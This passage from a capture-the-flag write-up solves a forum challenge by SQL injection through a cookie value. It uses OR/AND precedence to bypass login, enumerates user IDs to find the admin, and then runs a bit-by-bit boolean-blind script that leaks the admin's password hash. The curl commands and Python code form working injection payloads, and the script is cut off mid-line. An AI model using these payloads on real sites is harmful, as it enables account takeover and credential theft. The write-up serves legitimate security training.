SELECT user_id, user_name, user_level FROM users WHERE  user_id = 100 -- AND user_name = 'my_user' AND user_pass = 'my_pass'";
```
However, this didn't work, and other comment styles didn't affect the query either.
Another strategy would be to rewrite the query by taking advantage of MySQL's operator precedence and OR short-circuit evaluation. MySQL evaluations OR operators after finishing evaluating AND operators. So a query such as `SELECT true OR false AND false;` would return `true` since first the engine evaluates `false AND false` to `false` and then `true or false` to `true`.
In our example, this would map to setting the `user_id` cookie to `"100 or user_id = 9999"`, creating a query of:
```sql
SELECT user_id, user_name, user_level FROM users WHERE  user_id = 100 or user_id = 9999 AND user_name = 'my_user' AND user_pass = 'my_pass'";
```
Such a query should return the user entry for the user with ID `100` regardless of the password. Let's try it:
```console
root@kali:/media/sf_CTFs/technion/High_School_Project# curl 'http://ctf.cs.technion.ac.il:4010/'  -H "Cookie: user_id=100 or user_id = 9999 ; user_name=a; user_pass=a" -s | grep "Sign out"
    Hello 5845653! Not you? Sign out  
```
We can see that the forum has identified us as the user with username `5845653` even without entering a password.
The next thing we'd like to do is search for the admin account:
```console
root@kali:/media/sf_CTFs/technion/High_School_Project# for i in {0..10}; do echo $i; curl 'http://ctf.cs.technion.ac.il:4010/'  -H "Cookie: user_id=$i or user_id = 99
99 ; user_name=a; user_pass=a" -s | grep "Sign out" && echo; done
0
1
2
3
4
    Hello admin! Not you? Sign out  
5
6
    Hello admin1! Not you? Sign out  
7
8
    Hello admin2! Not you? Sign out  
9
    Hello DuckyDebugDuck! Not you? Sign out  
10
    Hello hey! Not you? Sign out  
```
We can see that the administrator has received user ID #4. We should now be able to visit the forum under his user and read his secrets.
```console
root@kali:/media/sf_CTFs/technion/High_School_Project# curl 'http://ctf.cs.technion.ac.il:4010/topic.php?id=1'  -H "Cookie: user_id=4 or user_id = 9999 ; user_name=a; user_pass=a" -s | head -n 35
Online Forum Project DSW
 Online Forum
       Home 
       Create a topic
       Create a category
    Hello admin! Not you? Sign out  
Posts in Flag topic
                        Post
                        Date and user name
                      import hashlib
password = input('Insert admin password: ')
x1 = hashlib.sha1(password.encode()).hexdigest()
x2 = hashlib.sha1(x1.encode()).hexdigest()[:10]
print('The flag is: cstechnion{A1m0$7_$3cUR3_' + x2 + '}')23-11-2020admina23-11-2020ytest223-11-2020revivo23-11-2020useryo send me the flag :(23-11-2020userWOOHOOO24-11-2020matan424-11-2020admin324-11-2020admin3asdasdaxzczc24-11-2020asdqwezxcasdasdaxzczc24-11-2020asdqwezxc24-11-2020asdqwezxcflag?24-11-2020asdqwezxcflag?24-11-2020asdqwezxcflag?24-11-2020asdqwezxcgot the flag lol YEET25-11-2020adminnice flag26-11-2020adminNice Flag! class="rightpart">26-11-2020adminAccording to all known laws
```
Between a lot of fake messages written by (probably) other participants which were able to login as admin, we see the following message:
```
password = input('Insert admin password: ')
x1 = hashlib.sha1(password.encode()).hexdigest()
x2 = hashlib.sha1(x1.encode()).hexdigest()[:10]
print('The flag is: cstechnion{A1m0$7_$3cUR3_' + x2 + '}')
```
So, we need to somehow extract the admin's password. We can turn our SQL injection into a boolean-blind injection and brute-force the password (or the password's hash, to be exact) character after character. This means that for each character in the `user_pass` field, we craft a query so that the user will be logged in only if the query is true. Something like this:
```sql
SELECT user_id, user_name, user_level FROM users WHERE  user_id = 4 and /*n-th character of user_pass is x*/ or user_id = 9999 AND user_name = 'my_user' AND user_pass = 'my_pass'";
```
For each index in the `user_password` string, we can try all possible characters until we see the user being welcomed as logged in. That's when we know we found the correct character. Usually this is done by injecting a query such as `and substring(user_pass,/*index*/,1) = char(/*current_character*/)`.
This should work but will require us to iterate over all possible characters for each index (in the worst case). It's not too bad in our case since we know that the field contains a hex string, so characters are limited to `[0-9a-f]`, but just for fun we'll use a slightly different method to recover each character in a constant number of queries: We'll just extract each character by performing 7 queries to identify each bit in the character (ASCII characters always have the eighth bit zeroed).
The code:
```python
from pwn import *
import requests
BITS_IN_BYTE        = 8
PASSWORD_FIELD_LEN  = 20*2 # SHA1 hash -> 20 bytes, each byte is printed as two characters
ADMIN_USER_ID       = 4
def inject_query(query):
    cookies = {
        "user_id": query,
        "user_name": "name",
        "user_pass": "pass"
    }
    r = requests.get("http://ctf.cs.technion.ac.il:4010/", cookies=cookies)
    return 'Not you? Sign out' in r.text
def leak_user_pass_character(user_id, index):
    byte = 0
    for i in range(BITS_IN_BYTE):
        bit_mask = (1 Sign out  
```
The last part is constructing the flag according to the instructions we got:
```python
>>> import hashlib
>>> x1 = "eef2c983660a888d1c23703ab1aef09f65d90edb"
>>> x2 = hashlib.sha1(x1.encode()).hexdigest()[:10]
>>> print('The flag is: cstechnion{A1m0$7_$3cUR3_' + x2 + '}')
The flag is: cstechnion{A1m0$7_$3cUR3_ee51f2a8c6}
```
Notice that we don't know the admin's password, but we do have the SHA1 of the password which is enough to get the flag.